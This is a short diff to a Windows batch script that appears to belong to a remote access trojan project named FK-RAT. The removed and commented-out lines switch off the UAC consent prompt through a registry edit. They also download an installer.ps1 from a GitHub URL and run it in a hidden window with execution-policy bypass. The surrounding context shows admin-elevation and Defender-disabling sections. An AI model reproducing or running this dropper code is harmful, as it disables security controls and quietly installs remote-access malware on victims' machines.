@@ -1,8 +1,6 @@
 REM get admin permissions for script
 @echo off
 
-powershell Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 0
-
 :: BatchGotAdmin
 :-------------------------------------
 REM  --> check for permissions
@@ -35,5 +33,6 @@ REM diable defender
 
 
 REM rat resources
-powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -URI https://raw.githubusercontent.com/Sunnickel/FK-RAT/main/files/installer.ps1 -OutFile installer.ps1"; 
-powershell Start-Process -windowstyle hidden -ep bypass "installer.ps1"
+powershell
+@REM powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -URI https://raw.githubusercontent.com/Sunnickel/FK-RAT/main/files/installer.ps1 -OutFile installer.ps1"; 
+@REM powershell Start-Process -windowstyle hidden -ep bypass "installer.ps1"
